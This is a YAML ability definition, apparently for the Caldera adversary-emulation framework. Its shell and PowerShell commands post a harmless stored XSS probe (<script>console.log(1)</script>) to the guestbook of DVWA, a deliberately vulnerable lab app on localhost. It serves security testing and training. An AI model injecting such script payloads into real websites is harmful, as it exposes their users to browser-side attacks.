- id: a1b2c3d4-dvwa-0009-xsss-000000000009
  name: DVWA - XSS Stored Probe (Low)
  description: Stores payload message in DVWA Guestbook endpoint
  tactic: persistence
  technique_id: T1189
  technique_name: Drive-by Compromise
  repeatable: false
  executors:
    - name: sh
      platform: linux
      command: |
        DVWA_URL="${DVWA_URL:-http://127.0.0.1:80/dvwa}"
        COOKIE_FILE="/tmp/dvwa_cookie.txt"
        curl -s -b "$COOKIE_FILE" -b "security=low" \
          -d "txtName=CalderaAgent&mtxMessage=%3Cscript%3Econsole.log(1)%3C/script%3E&btnSign=Sign+Guestbook" \
          "$DVWA_URL/vulnerabilities/xss_s/" > /dev/null || true
        echo "[+] Submitted XSS Stored entry"
        exit 0
      timeout: 30
    - name: psh
      platform: windows
      command: |
        $DvwaUrl = if ($env:DVWA_URL) { $env:DVWA_URL } else { "http://127.0.0.1:80/dvwa" }
        $CookieFile = "$env:TEMP\dvwa_cookie.txt"
        curl.exe -s -b "$CookieFile" -b "security=low" `
          -d "txtName=CalderaAgent&mtxMessage=%3Cscript%3Econsole.log(1)%3C/script%3E&btnSign=Sign+Guestbook" `
          "$DvwaUrl/vulnerabilities/xss_s/" | Out-Null
        Write-Output "[+] Submitted XSS Stored entry"
        exit 0
      timeout: 30
